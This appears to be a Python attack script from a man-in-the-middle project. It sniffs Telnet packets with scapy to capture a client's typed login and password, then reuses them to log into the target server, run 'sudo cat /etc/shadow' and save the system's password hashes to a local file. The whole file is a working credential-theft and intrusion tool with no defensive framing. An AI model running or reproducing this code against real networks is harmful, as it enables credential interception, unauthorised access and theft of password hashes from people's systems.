import telnetlib
from pip._vendor.distlib.compat import raw_input
from scapy.all import *
from src.mitm.utils import get_mac

user_login = []
user_password = []
counter = 0
target2_ip = ""


def get_telnet_credentials(pkt):
    global counter
    global user_login
    global user_password

    try:
        pkt.getlayer(Raw).load

    except Exception as e:
        return

    payload = str(pkt.getlayer(Raw).load)
    if payload != "b'\\r\\x00'" and counter == 1:
        user_login.append(payload[2])
        return

    elif payload != "b'\\r\\x00'" and counter == 2:
        user_password.append(payload[2])
        return

    elif payload == "b'\\xff\\xfd\\x01'":
        counter = 1
        return

    elif payload == "b'\\r\\x00'":
        counter = counter + 1
        if counter == 3:
            print("Credentials found in Telnet packets")
            use_telnet_credentials(user_login, user_password)
        else:
            return
    else:
        return


def use_telnet_credentials(login, password):
    global target2_ip

    str_login = ""
    str_password = ""

    for i in login:
        str_login = str_login + i
    for j in password:
        str_password = str_password + j

    print("user login: " + str_login + "| user password: " + str_password)

    try:
        print("Connecting to the host " + target2_ip + "...")
        tn = telnetlib.Telnet(target2_ip, 23, 2)
        tn.read_until(b"login: ", 2)
        tn.write(str_login.encode('ascii') + b"\n")
        tn.read_until(b"Password: ", 2)
        tn.write(str_password.encode('ascii') + b"\n")
        tn.write(b"sudo cat /etc/shadow\n")
        tn.read_until(b"[sudo] Mot de passe de " + str_login.encode('ascii') + b" : ", 2)
        tn.write(str_password.encode('ascii') + b"\n")
        tn.write(b"exit\n")
        read_data = tn.read_all()
        with open('output_data.txt', 'w') as output:
            output.write(str(read_data))
        print("[*] Ending Telnet Session: check output_data.txt for shadow file content")
        sys.exit(1)
        
    except Exception as e:
        print("an error occured: " + str(e))
        sys.exit(1)


def run():
    global target2_ip
    interface = "eth0"
    
    try:
        target1_ip = raw_input("[*] Enter Client IP: ")
        target2_ip = raw_input("[*] Enter Server IP: ")
        
    except KeyboardInterrupt:
        print("\n[*] User Requested Shutdown")
        print("[*] Exiting...")
        sys.exit(1)
    
    print("Analysing packets...")
    client_mac = get_mac(target1_ip)
    sniff(iface=interface, prn=get_telnet_credentials, filter='dst port 23 and ether src {}'.format(client_mac), store=0,
          count=0)
